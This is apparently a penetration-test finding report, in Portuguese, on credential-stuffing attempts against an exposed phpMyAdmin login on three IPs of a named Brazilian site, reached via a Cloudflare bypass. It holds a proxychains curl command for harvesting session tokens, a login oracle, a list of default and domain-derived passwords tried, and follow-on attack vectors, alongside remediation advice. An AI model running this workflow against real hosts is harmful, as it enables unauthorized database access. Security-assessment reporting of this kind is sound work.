@@ -1,0 +1,98 @@
+# F-024 — phpMyAdmin 5.2.3: cred stuffing root/admin default FALHOU (root customizado)
+
+**Host:** https://186.226.60.53|54|56/phpMyAdmin/ (via bypass CF, Host: desapegogames.com.br)
+**Serviço:** phpMyAdmin 5.2.3 (cookie auth, config vaza `user:"root"`)
+**Severidade:** CRÍTICO permanece (F-012) — exposto em 3 IPs; default/related creds falharam
+**Status:** VALIDADO — cred default NÃO funciona; MySQL root usa senha customizada
+**Operador:** exploit | **Data:** 2026-09-05T00:12Z
+
+## Contexto
+
+F-012 (CRÍTICO) confirmou phpMyAdmin 5.2.3 exposto em /phpMyAdmin/ nos 3 IPs
+de origem (via bypass CF), cookie auth, config inline vaza `user:"root"`.
+Esta validação testou cred stuffing no login phpMyAdmin com user root (default
+do config) e admin, com senhas default e relacionadas ao domínio.
+
+## Reprodução (não-destrutiva)
+
+### Mapeamento do login (token CSRF por sessão)
+
+```bash
+$ proxychains4 -q curl -s -k -H "Host: desapegogames.com.br" \
+    "https://186.226.60.54/phpMyAdmin/index.php?route=/" -c /tmp/pma_cookies.txt
+# Cookie: __Secure-phpMyAdmin_https=<session>
+# Form fields:
+#   <input type="hidden" name="token" value="7b762d7b474c3d2b6a747321407b2a7b">
+#   <input type="hidden" name="set_session" value="s1hkaglpru6nd9j4hq2gtid7sr">
+#   <input type="text"     name="pma_username">
+#   <input type="password" name="pma_password">
+#   <input type="hidden"   name="server" value="1">
+# Action: POST index.php?route=/
+```
+
+Fluxo por tentativa: GET (fresh cookie + token + set_session) → POST login.
+
+### Oracle de login
+
+- **FALHA (root)**: `Access denied` no body (mysqli_real_connect: Access denied
+  for user 'root'@'localhost').
+- **FALHA (admin)**: `Cannot log in to the MySQL server` (user admin pode não
+  existir no MySQL, ou rejeição diferente).
+- **Sucesso** (esperado): redirect com `token=` na Location ou `logged_in:true`
+  no body.
+
+### 15 tentativas (10s delay, root 12 senhas + admin 3) — TODAS FALHARAM
+
+```
+[-] 1  root:                  | Access denied
+[-] 2  root:root              | Access denied
+[-] 3  root:password          | Access denied
+[-] 4  root:admin             | Access denied
+[-] 5  root:mysql             | Access denied
+[-] 6  root:123456            | Access denied
+[-] 7  root:toor               | Access denied
+[-] 8  root:desapegogames     | Access denied
+[-] 9  root:desapego          | Access denied
+[-] 10 root:DesapegoGames     | Access denied
+[-] 11 root:desapegogames123  | Access denied
+[-] 12 root:root123           | Access denied
+[-] 13 admin:admin            | Cannot log
+[-] 14 admin:password         | Cannot log
+[-] 15 admin:123456           | Cannot log
+```
+
+Nenhuma cred default/relacionada ao domínio funcionou. Sem rate-limit/lockout
+visível (phpMyAdmin 5.x não tem fail2ban embutido; nginx pode ter, mas 15
+tentativas com 10s delay não triggeraram).
+
+## Impacto
+
+- **Default creds:** NÃO funcionam. MySQL `root` usa senha customizada forte.
+- **F-012 (CRÍTICO) PERMANECE:** phpMyAdmin continua exposto em 3 IPs via
+  bypass CF. Vetores restantes:
+  - Cred stuffing com wordlist de breach (sem wordlist nesta fase — baixa
+    probabilidade sem leak conhecido do DBA/owner).
+  - Creds vazadas de configs/backups (se obtidas por outro vetor — LFI, path
+    traversal, backup exposto, .env).
+  - Exploração de vuln do próprio phpMyAdmin (5.2.3 é versão mais recente,
+    sem CVEs públicos não-patched nesta data).
+  - Ataque à sessão cookie (csrf/hijack — improvável sem vetor adicional).
+- **DB total** permanece o payoff máximo se cred obtida por outro canal.
+
+## Recomendação
+
+- **Urgente (já em F-012):** remover phpMyAdmin do acesso público OU
+  protegê-lo com IP allowlist + Basic Auth + fail2ban.
+- Confirmar que a senha do MySQL `root` é forte (default/related falharam,
+  mas validar com auditoria interna).
+- Considerar desabilitar login remoto do MySQL root (`root@localhost` only).
+- Rotacionar senhas MySQL se houver suspeita de exposição.
+
+## Notas
+
+- O phpMyAdmin NÃO tem rate-limit próprio no login (15 tentativas sem
+  bloqueio). Cred stuffing em escala é tecnicamente viável via bypass CF
+  (sem WAF), mas requer wordlist de breach — não realizada nesta fase por
+  ausência de wordlist confiável e OPSEC (evitar ruído).
+- O config inline vaza `user:"root"` (default do form), mas o MySQL pode ter
+  outros usuários além de root. Apenas `root` e `admin` testados.
